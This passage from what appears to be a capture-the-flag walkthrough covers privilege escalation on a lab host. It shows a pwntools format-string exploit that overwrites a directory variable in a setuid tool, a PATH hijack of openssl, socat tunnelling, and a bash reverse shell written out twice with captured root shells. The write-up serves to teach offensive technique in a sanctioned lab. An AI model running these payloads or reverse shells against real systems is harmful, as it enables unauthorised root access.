If I attach `gdb` again (`sudo gdb -p $(pidof ersatool)`), I can see that the value of `ERSA_DIR` has changed (printed both as hex word and a string):

```console
gdb-peda$ x/xg &ERSA_DIR
0x5640f813e0f0 <ERSA_DIR>:      0x7361652f00000014
gdb-peda$ x/s &ERSA_DIR
0x5640f813e0f0 <ERSA_DIR>:      "\024"
```

The low 32-bit word has been overwritten with the value 0x14, which is 20, the number of bytes written before it reached the `%n` specifier. If I want a `/`, I need 47 instead of 20, which I can just change in the padding:

```python
p.sendline("%16$47p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr))
```

Running again and then attaching `gdb`:

```console
gdb-peda$ x/s &ERSA_DIR
0x55a4ded870f0 <ERSA_DIR>:      "/"
gdb-peda$ x/xg &ERSA_DIR
0x55a4ded870f0 <ERSA_DIR>:      0x7361652f0000002f
```

#### Write Path

Having shown I can write memory, I want to overwrite `ERSA_DIR` with `/dev/shm`, so I can drop my script in there and have it run.

| Format | Value |
|---|---|
| String | /dev/shm |
| Hex | 0x2f6465762f73686d |
| Little Endian | 0x6d68732f7665642f |
| Integer | 7883677795399066671 |

I just need to write 7,883,677,795,399,066,671 bytes before the `%n`. Clearly that isn’t going to work. But I can write it one byte at a time. In many format string attacks, this is done by alternating `%p` (or `%x`) and `%n` specifiers in the same string, with multiple addresses on in the payload to reference. But here, since I can take multiple hits at the format string vuln in the same process memory, I’ll just send a print request for each character I want to write.

I could do something like:

```python
p.sendline("%16$47p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr))
p.sendline("%16$100p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr+1))
p.sendline("%16$101p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr+2))
p.sendline("%16$118p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr+3))
p.sendline("%16$47p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr+4))
p.sendline("%16$115p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr+5))
p.sendline("%16$104p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr+6))
p.sendline("%16$109p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr+7))
```

In fact, that works. But cleaner would be to make a loop:

```python
for i,c in enumerate("/dev/shm"):
    p.sendline(f"%16${ord(c)}p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr+i))
    p.recvuntil(b"\n\n")
```

The `recvuntil` just clears out all the junk responses I don’t need (otherwise all the cached incoming data will dump when `interactive` is called). Running it presents a prompt:

```console
oxdf@parrot$ python3 root.py
[+] Starting local process './ersatool': pid 547061
[+] Leaked EXT address:          0x000055713e5aa15f
[+] Calculated ERSA_DIR address: 0x000055713e5aa0f0
[*] Switching to interactive mode
print->CN=$
```

And `gdb` shows the path overwritten:

```console
gdb-peda$ x/s &ERSA_DIR
0x55713e5aa0f0 <ERSA_DIR>:      "/dev/shm"
```

#### Finish Script

Now that I’ve overwritten the folder, I’ll just need to call `create` with any input to get the program to call `/dev/shm/easyrsa`. That’s a few more lines:

```python
p.sendline()             # return to main menu
p.recvuntil(b"#")        # get prompt
p.sendline(b"create")    # enter create menu
p.recvuntil(b"CN=")      # get prompt
p.sendline(b"0xdf")      # send anything
p.recv(4096)             # recv all sent error messages
```

Interestingly, if I don’t have a final `p.recv` at the end, it will just exit before the `create` method runs, and I don’t get execution. Just waiting for a response is enough to keep the program open. I removed the `interactive` call.

I’ll also need a script at `/dev/shm/easyrsa`:

```bash
#!/bin/bash

ping -c 2 127.0.0.1
```

It needs to be executable as well:

```console
oxdf@parrot$ chmod +x /dev/shm/easyrsa
```

Now I’ll start `tcpdump` and run the script:

```console
oxdf@parrot$ sudo tcpdump -i lo icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
11:30:46.818608 IP localhost > localhost: ICMP echo request, id 13015, seq 1, length 64
11:30:46.818616 IP localhost > localhost: ICMP echo reply, id 13015, seq 1, length 64
11:30:47.867404 IP localhost > localhost: ICMP echo request, id 13015, seq 2, length 64
11:30:47.867417 IP localhost > localhost: ICMP echo reply, id 13015, seq 2, length 64
```

That’s command execution.

#### Remote Exploitation

To make this work remotely, I’ll need to interact with the binary. PwnTools isn’t on the container, so I’ll create tunnels so that my host can interact with the binary. I’ll use `socat`to both tunne from web to pki, and to host `ersatool` on pki:

![image-20211217115726485](https://0xdfimages.gitlab.io/img/image-20211217115726485.png)

On pki, I’ll drop a simple Bash script into `/dev/shm` to create a reverse shell back to web:

```console
www-data@pki:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/192.168.254.2/4433 0>&1'
#!/bin/bash

bash -i >& /dev/tcp/192.168.254.2/4433 0>&1
www-data@pki:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/192.168.254.2/4433 0>&1' > easyrsa
www-data@pki:/dev/shm$ chmod +x easyrsa
```

I’ll upload `socat` to web (using Python webserver). I need a good way to get it to pki. I wrote a short Python script:

```python
#!/usr/bin/env python3

import socket

s = socket.socket()
s.connect(('192.168.254.2', 4433))
with open('/tmp/socat', 'wb') as f:
    data = s.recv(1024)
    while data:
        f.write(data)
        data = s.recv(1024)
s.close()
```

On web I ran `/tmp/nc -lnvp 4433 < socat`. Then I ran that script, and it go `socat` (and the MD5s matched).

On pki:

```console
www-data@pki:/tmp$ ./socat TCP-LISTEN:9001,reuseaddr,fork EXEC:ersatool
```

On web:

```console
www-data@web:/tmp$ ./socat tcp-listen:9001,reuseaddr,fork tcp:pki:9001
```

Now from my host, I can connect to the running binary:

```console
oxdf@parrot$ nc 172.20.0.10 9001
# print
print->CN=0xdf
0xdf[!] ERR reading /opt/easyrsa/clients/0xdf.ovpn!

print->CN=
```

At the top of the script, I’ll add:

```python
if args['REMOTE']:
    p = remote('172.20.0.10', 9001)
else:
    p = process('./ersatool')
```

With PwnTools, now if I add `REMOTE` as an arg, it will go remote, and otherwise local.

One last snag was that `/dev/shm` is mounted `noexec` on pki, so I can execute out of there. I’ll switch to `/tmp` in the script by changing that string.

I’ll open a third shell to web (one has www-data shell from pki which has `socat` serving `ersatool`, one has `socat` tunneling from my host to pki), and start `nc` listening on 4433.

Locally, I’ll run the script to target remove. It leaks the address, and then hangs:

```console
oxdf@parrot$ python3 root.py REMOTE
[+] Opening connection to 172.20.0.10 on port 9001: Done
[+] Leaked EXT address:          0x000056253b35215f
[+] Calculated ERSA_DIR address: 0x000056253b3520f0
```

At the listener on web, there’s a shell:

```console
www-data@web:~$ /tmp/nc -lnvp 4433
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::4433
Ncat: Listening on 0.0.0.0:4433
Ncat: Connection from 192.168.254.3.
Ncat: Connection from 192.168.254.3:50426.
root@pki:/tmp# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

And `root.txt`:

```console
root@pki:/tmp# cat /root/root.txt
da5d9a75************************
```

### Unintended Path Hijack

#### Enumeration

My favorite tool for watching processes on Linux is [pspy](https://github.com/DominicBreuker/pspy). I’ll upload it to pki the same way I uploaded `socat` above, and give it a run:

```console
www-data@pki:/tmp$ ./pspy
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/08/16 11:43:37 CMD: UID=33   PID=9      | nginx: worker process
2021/08/16 11:43:37 CMD: UID=0    PID=8      | nginx: master process nginx
2021/08/16 11:43:37 CMD: UID=0    PID=6      | /bin/bash /entry.sh
2021/08/16 11:43:37 CMD: UID=33   PID=495    | ./pspy
...[snip]...
```

Now I’ll request a cert using `?cn=0xdf` on the webpage:

```plaintext
2021/08/16 11:45:17 CMD: UID=33   PID=509    | sh -c /usr/bin/ersatool create 0xdf
2021/08/16 11:45:17 CMD: UID=33   PID=511    | /usr/bin/ersatool create 0xdf
2021/08/16 11:45:17 CMD: UID=33   PID=510    | /usr/bin/ersatool create 0xdf
2021/08/16 11:45:17 CMD: UID=0    PID=512    | sh -c /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=513    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=514    | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`ChangeMe`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
2021/08/16 11:45:17 CMD: UID=0    PID=515    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=516    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=517    | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`0xdf`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
2021/08/16 11:45:17 CMD: UID=0    PID=518    | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`0xdf`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
2021/08/16 11:45:17 CMD: UID=0    PID=521    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=522    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=523    | mv /opt/easyrsa/pki/reqs/0xdf.req.vFFvqaRuDG /opt/easyrsa/pki/reqs/0xdf.req
2021/08/16 11:45:17 CMD: UID=0    PID=524    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=525    | cat /opt/easyrsa/pki/serial
2021/08/16 11:45:17 CMD: UID=0    PID=526    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=527    | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`0xdf`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
2021/08/16 11:45:17 CMD: UID=0    PID=528    | openssl req -in /opt/easyrsa/pki/reqs/0xdf.req -noout
2021/08/16 11:45:17 CMD: UID=0    PID=529    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=530    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=531    | cat /opt/easyrsa/x509-types/COMMON
2021/08/16 11:45:17 CMD: UID=0    PID=532    | cat /opt/easyrsa/x509-types/client
2021/08/16 11:45:17 CMD: UID=0    PID=535    |
2021/08/16 11:45:17 CMD: UID=0    PID=534    | /bin/sh /opt/easyrsa/easyrsa build-client-full 0xdf nopass batch
2021/08/16 11:45:17 CMD: UID=0    PID=536    | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`0xdf`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
2021/08/16 11:45:17 CMD: UID=0    PID=538    | openssl ca -utf8 -in /opt/easyrsa/pki/reqs/0xdf.req -out /opt/easyrsa/pki/issued/0xdf.crt.RPtfHT0Pbx -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days 36500 -batch
2021/08/16 11:45:17 CMD: UID=0    PID=539    | mv /opt/easyrsa/pki/issued/0xdf.crt.RPtfHT0Pbx /opt/easyrsa/pki/issued/0xdf.crt
```

With this, I can walk through all the steps that are being called in `ersatool`, but the two lines that are most interesting are:

```plaintext
2021/08/16 11:45:17 CMD: UID=0    PID=528    | openssl req -in /opt/easyrsa/pki/reqs/0xdf.req -noout
2021/08/16 11:45:17 CMD: UID=0    PID=538    | openssl ca -utf8 -in /opt/easyrsa/pki/reqs/0xdf.req -out /opt/easyrsa/pki/issued/0xdf.crt.RPtfHT0Pbx -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days 36500 -batch
```

`openssl` is being called without the full path.

#### Theory

I’ve shown [path hijack](https://0xdf.gitlab.io/tags.html#path-hijack) exploits several times before. When a process calls another one without giving a full path, the current `$PATH` variable is used to look for that binary. Unfortunately, that’s something that is set by the current session, and it is something the current user can set.

If I update the path in my current shell to include a folder I can write to before the legit folder containing `openssl`, then the computer will check that folder first, and if I add a binary named `openssl`, it will run instead of the legit one.

The path on pki is by default:

```console
www-data@pki:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

But I can easily change that for my current shell to start with `/tmp`:

```console
www-data@pki:/tmp$ export PATH=/tmp:$PATH
www-data@pki:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

#### Exploit

With a shell on pki, I’ll create a simple reverse shell script and save it as `openssl`:

```console
www-data@pki:/tmp$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/192.168.254.2/4433 0>&1' > openssl
www-data@pki:/tmp$ chmod +x openssl
```

With `nc` listening on web, I’ll run `ersatool`, and when I try to `create` with any `CN`, it hangs:

```console
www-data@pki:/tmp$ ersatool
# create
create->CN=0xdf
```

That’s because at this point it’s trying to call `openssl`, and it got my version instead of the real one. At `nc` on web, there’s a root shell:

```console
www-data@web:~$ /tmp/nc -lnvp 4433
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::4433
Ncat: Listening on 0.0.0.0:4433
Ncat: Connection from 192.168.254.3.
Ncat: Connection from 192.168.254.3:45310.
root@pki:/opt/easyrsa# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

#### Code

The version of easy-rsa on Static is 3.0.6, which is a couple years old:

```console
root@pki:/opt/easyrsa# head ChangeLog
Easy-RSA 3 ChangeLog

3.0.6 (2019-02-01)
   * Certificates that are revoked now move to a revoked subdirectory (#63)
   * EasyRSA no longer clobbers non-EASYRSA environment variables (#277)
   * More sane string checking, allowingn for commas in CN (#267)
   * Support for reasonCode in CRL (#280)
   * Better handling for capturing passphrases (#230, others)
   * Improved LibreSSL/MacOS support
   * Adds support to renew certificates up to 30 days before expiration (#286)
```

[easy-rsa](https://github.com/OpenVPN/easy-rsa) is open source, so I can poke at the code on GitHub to see how this works. I can look at either the [3.0.6 branch](https://github.com/OpenVPN/easy-rsa/tree/v3.0.6) or the current master, as the issue is the same in both places. The `easyrsa` that is called by `ersatool` is a Bash script in the `easyrsa3` folder on GitHub. At line [1710](https://github.com/OpenVPN/easy-rsa/blob/243bb708b02897c563631ce62633d90ae80c82ff/easyrsa3/easyrsa#L1710), the script sets a bunch of environment variables with `set_var`, including on line 1712 where it sets `EASYRSA_OPENSSL` to `openssl`:

![image-20210816072537723](https://0xdfimages.gitlab.io/img/image-20210816072537723.png)

This variable is executed many times in the script. For example, in `verify_ssl_lib` on [lines 456-475](https://github.com/OpenVPN/easy-rsa/blob/243bb708b02897c563631ce62633d90ae80c82ff/easyrsa3/easyrsa#L456):

![image-20210816072748630](https://0xdfimages.gitlab.io/img/image-20210816072748630.png)

On line 459, it runs:

```bash
val="$("$EASYRSA_OPENSSL" version)"
```

That will run `$EASYRSA_OPENSSL version` in a subshell and save the result to `$val`.

To fix this, the script would need to reference the `openssl` binary with full path. I suspect they don’t do this because the location may vary on different hosts, and they don’t want to have to support checking each possible place.
